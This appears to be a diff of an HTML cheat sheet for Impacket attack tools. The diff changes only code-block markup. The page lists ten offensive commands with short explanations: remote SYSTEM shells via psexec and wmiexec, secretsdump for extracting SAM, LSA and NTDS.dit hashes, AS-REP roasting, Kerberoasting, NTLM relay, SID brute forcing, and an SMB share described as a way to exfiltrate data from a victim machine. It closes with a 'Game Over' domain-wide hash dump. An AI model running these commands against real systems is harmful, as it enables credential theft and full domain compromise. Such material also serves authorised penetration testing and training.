@@ -126,58 +126,58 @@
 <p><strong>Impacket</strong> is a collection of Python classes for working with network protocols. It includes legendary scripts like <code>psexec.py</code> and <code>secretsdump.py</code>.</p>
 <h2>Top 10 Useful Commands</h2>
 <h3>1. PsExec (Interactive Shell)</h3>
-<div class="codehilite"><pre><span></span><code>impacket-psexec<span class="w"> </span>domain/user:pass@10.10.10.10
-</code></pre></div>
+<pre class="codehilite"><code class="language-bash">impacket-psexec domain/user:pass@10.10.10.10
+</code></pre>
 
 <p><strong>Explanation:</strong> Get a <code>SYSTEM</code> shell using SMB. Uploads a service binary.</p>
 <h3>2. SecretsDump (Dump Everything)</h3>
-<div class="codehilite"><pre><span></span><code>impacket-secretsdump<span class="w"> </span>domain/user:pass@10.10.10.10
-</code></pre></div>
+<pre class="codehilite"><code class="language-bash">impacket-secretsdump domain/user:pass@10.10.10.10
+</code></pre>
 
 <p><strong>Explanation:</strong> Dumps SAM, LSA, and DCC2 hashes. If ran against DC, dumps NTDS.dit (all domain users).</p>
 <h3>3. SMBClient</h3>
-<div class="codehilite"><pre><span></span><code>impacket-smbclient<span class="w"> </span>domain/user:pass@10.10.10.10
-</code></pre></div>
+<pre class="codehilite"><code class="language-bash">impacket-smbclient domain/user:pass@10.10.10.10
+</code></pre>
 
 <p><strong>Explanation:</strong> Interactive SMB file transfer client (like FTP).</p>
 <h3>4. WMI Exec (Stealthier Shell)</h3>
-<div class="codehilite"><pre><span></span><code>impacket-wmiexec<span class="w"> </span>domain/user:pass@10.10.10.10
-</code></pre></div>
+<pre class="codehilite"><code class="language-bash">impacket-wmiexec domain/user:pass@10.10.10.10
+</code></pre>
 
 <p><strong>Explanation:</strong> functionality like psexec but uses WMI. Doesn't drop a binary, so often cleaner/stealthier.</p>
 <h3>5. SMB Server (File Hosting)</h3>
-<div class="codehilite"><pre><span></span><code>impacket-smbserver<span class="w"> </span>shareName<span class="w"> </span>/path/to/files<span class="w"> </span>-smb2support
-</code></pre></div>
+<pre class="codehilite"><code class="language-bash">impacket-smbserver shareName /path/to/files -smb2support
+</code></pre>
 
 <p><strong>Explanation:</strong> Host a local SMB share instantly. Good for exfiltrating data TO your machine from a victim windows box.</p>
 <h3>6. GetNPUsers (AS-REP Roasting)</h3>
-<div class="codehilite"><pre><span></span><code>impacket-GetNPUsers<span class="w"> </span>domain.local/<span class="w"> </span>-usersfile<span class="w"> </span>users.txt<span class="w"> </span>-format<span class="w"> </span>hashcat<span class="w"> </span>-outputfile<span class="w"> </span>hashes
-</code></pre></div>
+<pre class="codehilite"><code class="language-bash">impacket-GetNPUsers domain.local/ -usersfile users.txt -format hashcat -outputfile hashes
+</code></pre>
 
 <p><strong>Explanation:</strong> Attack users with "Do Not Require Kerberos Pre-Auth". No password needed to ask.</p>
 <h3>7. GetUserSPNs (Kerberoasting)</h3>
-<div class="codehilite"><pre><span></span><code>impacket-GetUserSPNs<span class="w"> </span>domain.local/user:pass<span class="w"> </span>-request
-</code></pre></div>
+<pre class="codehilite"><code class="language-bash">impacket-GetUserSPNs domain.local/user:pass -request
+</code></pre>
 
 <p><strong>Explanation:</strong> Request TGS tickets for service accounts. The results can be cracked off-line.</p>
 <h3>8. MSSQL Client</h3>
-<div class="codehilite"><pre><span></span><code>impacket-mssqlclient<span class="w"> </span>domain/user:pass@10.10.10.10
-</code></pre></div>
+<pre class="codehilite"><code class="language-bash">impacket-mssqlclient domain/user:pass@10.10.10.10
+</code></pre>
 
 <p><strong>Explanation:</strong> Connect to SQL Server. Supports capabilities like <code>xp_cmdshell</code> execution.</p>
 <h3>9. Lookupsid</h3>
-<div class="codehilite"><pre><span></span><code>impacket-lookupsid<span class="w"> </span>domain/user:pass@10.10.10.10
-</code></pre></div>
+<pre class="codehilite"><code class="language-bash">impacket-lookupsid domain/user:pass@10.10.10.10
+</code></pre>
 
 <p><strong>Explanation:</strong> Brute force SIDs to enumerate local and domain users/groups.</p>
 <h3>10. NTLM Relay</h3>
-<div class="codehilite"><pre><span></span><code>impacket-ntlmrelayx<span class="w"> </span>-t<span class="w"> </span>smb://10.10.10.20<span class="w"> </span>-smb2support
-</code></pre></div>
+<pre class="codehilite"><code class="language-bash">impacket-ntlmrelayx -t smb://10.10.10.20 -smb2support
+</code></pre>
 
 <p><strong>Explanation:</strong> Listen for incoming NTLM connection attempts and relay them to another target.</p>
 <h2>The Most Powerful Command</h2>
-<div class="codehilite"><pre><span></span><code>impacket-secretsdump<span class="w"> </span>domain/admin:pass@10.10.10.10
-</code></pre></div>
+<pre class="codehilite"><code class="language-bash">impacket-secretsdump domain/admin:pass@10.10.10.10
+</code></pre>
 
 <p><strong>Explanation:</strong> The "Game Over" command. If you have admin creds on the Domain Controller, this extracts the NTLM hash of every user in the entire domain (History, krbtgt, etc).</p>
         </div>
